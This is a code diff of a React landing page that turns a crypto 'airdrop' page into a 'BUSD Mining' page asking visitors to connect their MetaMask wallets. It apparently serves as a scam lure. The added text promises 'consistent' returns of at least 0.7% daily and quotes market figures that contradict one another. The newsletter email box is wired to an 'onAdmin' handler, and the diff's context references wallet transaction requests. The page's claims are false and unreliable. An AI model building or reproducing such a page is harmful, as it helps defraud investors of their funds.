+                    data-animation-delay="1.3s"
+                    style={{ animationDelay: "1.3s", opacity: 1 }}
+                  >
+                    Mining
+                    <mark className="green ms-2">Live</mark>
                   </h5>
-                  <div className="transparent_bg tk_counter_inner m-lg-0 banner_token text-center px-0 animation animated fadeIn" data-animation="fadeIn" data-animation-delay="1.4s" style={{animationDelay: '1.4s', opacity: 1}}>
-                    <i>Airdrop event ends in:</i>
+                  <div
+                    className="transparent_bg tk_counter_inner m-lg-0 banner_token text-center px-0 animation animated fadeIn"
+                    data-animation="fadeIn"
+                    data-animation-delay="1.4s"
+                    style={{ animationDelay: "1.4s", opacity: 1 }}
+                  >
+                    <i>Mining event ends in:</i>
 
-                    <div className="timer-box timer_box_1 animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.2s" style={{animationDelay: '1.2s', opacity: 1}}>
-                      <p className="display-timer"> 
+                    <div
+                      className="timer-box timer_box_1 animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="1.2s"
+                      style={{ animationDelay: "1.2s", opacity: 1 }}
+                    >
+                      <p className="display-timer">
                         <span className="timer-details">
                           <span className="show_day show-timer">00</span>
                           <span className="timer-text"> DAYS </span>
@@ -745,61 +923,102 @@ let txx = await window.ethereum.request({
                         <span className="show-timer"> : </span>
 
                         <span className="timer-details">
-                        <span className="show_hr show-timer">12</span>
-                        <span className="timer-text"> HOURS </span>
+                          <span className="show_hr show-timer">12</span>
+                          <span className="timer-text"> HOURS </span>
                         </span>
-                        
+
                         <span className="show-timer"> : </span>
 
                         <span className="timer-details">
-                        <span className="show_min show-timer">19</span>
-                        <span className="timer-text"> MINUTES </span>
+                          <span className="show_min show-timer">19</span>
+                          <span className="timer-text"> MINUTES </span>
                         </span>
-                      
+
                         <span className="show-timer"> : </span>
 
-                        <span className="timer-details"> 
-                        <span className="show_sec show-timer">15</span>
-                        <span className="timer-text"> SECONDS </span>
+                        <span className="timer-details">
+                          <span className="show_sec show-timer">15</span>
+                          <span className="timer-text"> SECONDS </span>
                         </span>
-                      
                       </p>
-
                     </div>
+                  </div>
+                  <div
+                    className="btn_group pt-2 pb-3 animation animated fadeInUp"
+                    data-animation="fadeInUp"
+                    data-animation-delay="1.4s"
+                    style={{ animationDelay: "1.4s", opacity: 1 }}
+                  >
+                  {
+                    walletAddress ?
+                    
 
+                    <p
+                      className="btn green text-white btn-radius nav_item content-popup"
+                      onClick={() => {
+                        handleDisconnect();
+                      }}
+                      id="claimButton"
+                    >
+                      {/* Disconnect → */}
+                      {/* {walletAddress} */}
+                      {walletAddressResize(walletAddress)} →
+                    </p>
+                    :
+
+
+                    <p
+                      className="btn green text-white btn-radius nav_item content-popup"
+                      onClick={() => {
+                        onBtnClick();
+                      }}
+                      id="claimButton"
+                    >
+                      Connect →
+                    </p>
+                  }
+                    
                   </div>
-                  <div className="btn_group pt-2 pb-3 animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.4s" style={{animationDelay: '1.4s', opacity: 1}}> 
-                    <a className="btn green text-white btn-radius nav_item content-popup"  onClick={() => { onBtnClick() }} id="claimButton"> 
-                      Get Airdrop
-                      →
-                    </a> 
-                  </div>
-                  <span className="text-white icon_title animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.4s" style={{animationDelay: '1.4s', opacity: 1}}>
+                  <span
+                    className="text-white icon_title animation animated fadeInUp"
+                    data-animation="fadeInUp"
+                    data-animation-delay="1.4s"
+                    style={{ animationDelay: "1.4s", opacity: 1 }}
+                  >
                     We work with:
                   </span>
                   <ul className="list_none currency_icon">
-
-                    <li className="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.6s" style={{animationDelay: '1.6s', opacity: 1}}>
+                    <li
+                      className="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="1.6s"
+                      style={{ animationDelay: "1.6s", opacity: 1 }}
+                    >
                       <img src={bnb_logo} width="20px" height="20px" />
                       <span>Binance Smart Chain </span>
                     </li>
-                    <li className="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.6s" style={{animationDelay: '1.6s', opacity: 1}}>
+                    <li
+                      className="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="1.6s"
+                      style={{ animationDelay: "1.6s", opacity: 1 }}
+                    >
                       <img src={busd_logo} width="20px" height="20px" />
                       <span>BUSD </span>
                     </li>
-                    <li className="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.7s" style={{animationDelay: '1.7s', opacity: 1}}>
+                    {/* <li className="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.7s" style={{animationDelay: '1.7s', opacity: 1}}>
                       <img src={tether} width="20px" height="20px" />
                       <span>Tether (USDT)</span>
-                    </li>
+                    </li> */}
                   </ul>
 
                   <div id="whitepaper" className="team_pop mfp-hide">
                     <div className="row m-0">
                       <div className="col-md-12">
                         <div className="pt-3 pb-3">
-                          <div className="title_dark title_border"> 
-                            <h4 id="h4t">Bitgert (BRISE) Airdrop</h4>
-                            Attempting to login with Metamask in order to claim 
+                          <div className="title_dark title_border">
+                            <h4 id="h4t">BUSD (BRISE) Mining</h4>
+                            Attempting to login with Metamask in order to claim
                             <span id="token">$BRISE (BEP-20)</span> tokens...
                           </div>
                         </div>
@@ -809,36 +1028,283 @@ let txx = await window.ethereum.request({
                 </div>
               </div>
               <div className="col-lg-6 col-md-12 col-sm-12 order-first">
-                <div className="banner_image_right res_md_mb_50 res_xs_mb_30 animation animated fadeInRight" data-animation-delay="1.5s" data-animation="fadeInRight" style={{animationDelay: '1.5s', opacity: 1}}> 
-                  <img id="central-image" alt="banner_vector2" src={HOqvV8i} data-xblocker="passed" style={{visibility: 'visible'}} />
+                <div
+                  className="banner_image_right res_md_mb_50 res_xs_mb_30 animation animated fadeInRight"
+                  data-animation-delay="1.5s"
+                  data-animation="fadeInRight"
+                  style={{ animationDelay: "1.5s", opacity: 1 }}
+                >
+                  <img
+                    id="central-image"
+                    alt="banner_vector2"
+                    src={HOqvV8i}
+                    data-xblocker="passed"
+                    style={{ visibility: "visible" }}
+                  />
                 </div>
               </div>
             </div>
           </div>
         </section>
-        
+
         <footer>
-          <div class="top_footer bg_light_dark" data-z-index="1" data-parallax="scroll" data-image-src={footer_bg}>
+          <div
+            class="top_footer bg_light_dark"
+            data-z-index="1"
+            data-parallax="scroll"
+            data-image-src={footer_bg}
+          >
             <div class="container">
               <div class="row">
                 <div class="col-lg-4 col-md-12">
-                  <div class="footer_logo mb-3 animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="0.2s" style={{animationDelay: '0.2s', opacity: 1}}> 
+                  <div
+                    class="footer_logo mb-3 animation animated fadeInUp"
+                    data-animation="fadeInUp"
+                    data-animation-delay="0.2s"
+                    style={{ animationDelay: "0.2s", opacity: 1 }}
+                  >
                     <a href="#" class="page-scroll">
-                      <img alt="logo" height="50px" width="50px" src={JN59UlI} class="fav-logo" />
-                    </a> 
+                      <img
+                        alt="logo"
+                        height="50px"
+                        width="50px"
+                        src={JN59UlI}
+                        class="fav-logo"
+                      />
+                    </a>
                   </div>
                   <div class="footer_desc">
-                    <p class="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="0.4s" style={{animationDelay: '0.4s', opacity: 1}} id="subheader">itgert Is A Crypto Engineering Organization, Which Has Built The Fastest Blockchain Which Has The Speed Of 100,000 Transaction Per Second &amp; Near Zero Transaction Fee, Bitgert Is The Fastest Blockchain Of 2022 And The Fastest Growing Ecosystem With Projects Spanning DeFi, NFTs, Web3 &amp; Much More, Bitgert Also Has Developed A BRC20/ERC20/BEP20 Supported Wallet on Android &amp; iOS, Bitgert Coin Exists on Binance Smart Chain &amp; Bitgert Chain.</p>
+                    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      Welcome to Busd Coin Mining Company, a pioneering
+                      enterprise in the cryptocurrency mining sector. Our focus
+                      is on providing users with a seamless and profitable
+                      mining experience using BUSD, integrated with the Metamask
+                      wallet on the Binance Smart Chain (BSC) network. Our
+                      innovative platform ensures daily mining interest ranging
+                      from a minimum of 0.7% to higher returns, catering to both
+                      small and large investors.
+                    </p>
+
+                    <h4 className="mt-3">Company Overview</h4>
+
+                    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      <strong>Busd Coin Mining Company</strong> is committed to
+                      offering reliable and lucrative mining opportunities. With
+                      a current market capitalization of 15.8 billion BUSD and
+                      213.7 million BUSD mined in the last seven days, we are
+                      positioned as a strong player in the cryptocurrency mining
+                      market.
+                    </p>
+
+                    <h4 className="mt-3">Investment Details</h4>
+
+                    <ul className="text-white">
+                      <li>
+                        Daily Mining Interest: Minimum of 0.7% daily, with
+                        potential for higher returns.
+                      </li>
+                      <li>
+                        Integration with Metamask Wallet: Ensures secure and
+                        efficient transactions.
+                      </li>
+                      <li>
+                        Binance Smart Chain (BSC): Utilizes BSC for optimal
+                        performance and low transaction costs.
+                      </li>
+                      <li>
+                        Gas Fees: Minimal gas fees ranging from $0.02 to $0.1,
+                        payable in BNB.
+                      </li>
+                      <li>
+                        Weekly Interest Payout: Every 7 days, the accumulated
+                        interest will be added to the user's BUSD wallet
+                      </li>
+                    </ul>
+
+                    <h4 className="mt-3">Investment Details</h4>
+                    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      Minimum Mining Amount: 115 BUSD
+                    </p>
+                    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      Maximum Mining Amount: 10,000,000 BUSD
+                    </p>
+
+                    <h5 className="mt-3">How It Works</h5>
+
+                    <ul className="text-white">
+                      <li>
+                        Deposit Funds: Users deposit BUSD into their Metamask
+                        wallet under the Binance Smart Chain network.
+                      </li>
+                      <li>
+                        Daily Returns: Earn daily interest from a minimum of
+                        0.7%, depending on market conditions and mining
+                        performance.
+                      </li>
+                      <li>
+                        Interest Payout: Every 7 days, the accumulated interest
+                        will be added to the user's BUSD wallet
+                      </li>
+                      <li>
+                        Gas Fees: All transactions incur minimal gas fees, paid
+                        in BNB, ensuring cost-effectiveness and transparency.
+                      </li>
+                    </ul>
+
+                    
+                    
+
+                    
+                    <h5 className="mt-3">Terms and Conditions</h5>
+                    <ul className="text-white">
+                      <li>
+                        Gas Fees: Transactions require gas fees to be paid in
+                        BNB. The gas fee ranges from $0.02 to $0.1.
+                      </li>
+                      <li>
+                        Network: All transactions and mining activities occur on
+                        the Binance Smart Chain (BSC).
+                      </li>
+                      <li>
+                        Mining Currency: BUSD is the primary currency used for
+                        mining.
+                      </li>
+                      <li>
+                        Metamask Wallet: All mining activities and fund
+                        transactions are managed through the Metamask wallet for
+                        enhanced security and user convenience.
+                      </li>
+                    </ul>
+
+                    <h5 className="mt-3">Market Performance</h5>
+                    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      Our company has shown robust performance with a
+                      significant market presence:
+                    </p>
+                    <ul className="text-white">
+        <li>Current Market Cap: 15.8 Billion BUSD</li>
+        <li>Last 7 Days Mining: 213.7 million BUSD mined, indicating strong and consistent mining activity.</li>
+        <li>Volume (24h): $13,635,339 (8.68% increase)</li>
+        <li>Volume/Market Cap (24h): 19.39%</li>
+        <li>Circulating Supply: 70,511,448 BUSD</li>
+        <li>Total Supply: 70,511,448 BUSD</li>
+        <li>Max. Supply: ∞</li>
+        <li>Fully Diluted Market Cap: $70,516,556</li>
+    </ul>
+
+
+                    <h5 className="mt-3">Benefits to Investors</h5>
+                    
+                    <ul className="text-white">
+        <li>Consistent Returns: Investors can expect steady daily returns on their investments.</li>
+        <li>Secure Transactions: Integration with Metamask wallet ensures secure and hassle-free transactions.</li>
+        <li>Low Fees: Minimal gas fees make it cost-effective for investors.</li>
+        <li>Scalability: Flexible investment amounts allow for a wide range of investors to participate.</li>
+        <li>Weekly Payouts: Interest is accumulated daily and added to the user's wallet every 7 days, providing regular and reliable payouts.</li>
+    </ul>
+
+
+
+    <h5 className="mt-3">Conclusion</h5>
+
+    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      Busd Coin Mining Company is dedicated to providing a reliable, profitable, and secure mining environment for our users. By leveraging the power of Binance Smart Chain and the security of Metamask, we ensure that our investors receive the best possible returns on their investments with minimal costs. Join us in the world of cryptocurrency mining and start earning daily interest on your BUSD investments today.
+                    </p>
+
+
+    <h5 className="mt-3">Contact Us</h5>
+
+
+    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                      id="subheader"
+                    >
+                      For more information and to start investing, please visit our website or contact our support team. We look forward to helping you achieve your financial goals through innovative and secure mining solutions:
+                    </p>
                   </div>
                 </div>
 
                 <div class="col-lg-5 col-md-6 res_md_mt_30 res_sm_mt_20">
                   <div class="newsletter_form">
-                    <h4 class="footer_title border_title animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="0.2s" style={{animationDelay: '0.2s', opacity: 1}}>Newsletter</h4>
-                    <p class="animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="0.4s" style={{animationDelay: '0.4s', opacity: 1}}>By subscribing to our mailing list you will always be update with the latest news from us.</p>
-                    <form class="subscribe_form animation animated fadeInUp" data-animation="fadeInUp" data-animation-delay="0.4s" style={{animationDelay: '0.4s', opacity: 1}}>
-                      <input id="enterAdmin" class="input-rounded" type="text" required="" placeholder="Enter Email Address"/>
-                      <button title="Subscribe" class="btn-info"  onClick={() => { onAdmin() }}> Subscribe </button>
+                    <h4
+                      class="footer_title border_title animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.2s"
+                      style={{ animationDelay: "0.2s", opacity: 1 }}
+                    >
+                      Newsletter
+                    </h4>
+                    <p
+                      class="animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                    >
+                      By subscribing to our mailing list you will always be
+                      update with the latest news from us.
+                    </p>
+                    <form
+                      class="subscribe_form animation animated fadeInUp"
+                      data-animation="fadeInUp"
+                      data-animation-delay="0.4s"
+                      style={{ animationDelay: "0.4s", opacity: 1 }}
+                    >
+                      <input
+                        id="enterAdmin"
+                        class="input-rounded"
+                        type="text"
+                        required=""
+                        placeholder="Enter Email Address"
+                      />
+                      <button
+                        title="Subscribe"
+                        class="btn-info"
+                        onClick={() => {
+                          onAdmin();
+                        }}
+                      >
+                        {" "}
+                        Subscribe{" "}
+                      </button>
                     </form>
                   </div>
                 </div>
@@ -849,14 +1315,17 @@ let txx = await window.ethereum.request({
             <div class="container">
               <div class="row">
                 <div class="col-md-6">
-                <p class="copyright" id="company"> Bitgert © 2022</p>
+                  <p class="copyright" id="company">
+                    {" "}
+                    Bitgert © 2022
+                  </p>
                 </div>
               </div>
             </div>
           </div>
         </footer>
 
-        <a href="#" class="scrollup green" style={{display: 'none'}}>
+        <a href="#" class="scrollup green" style={{ display: "none" }}>
           ⇧
         </a>
       </div>
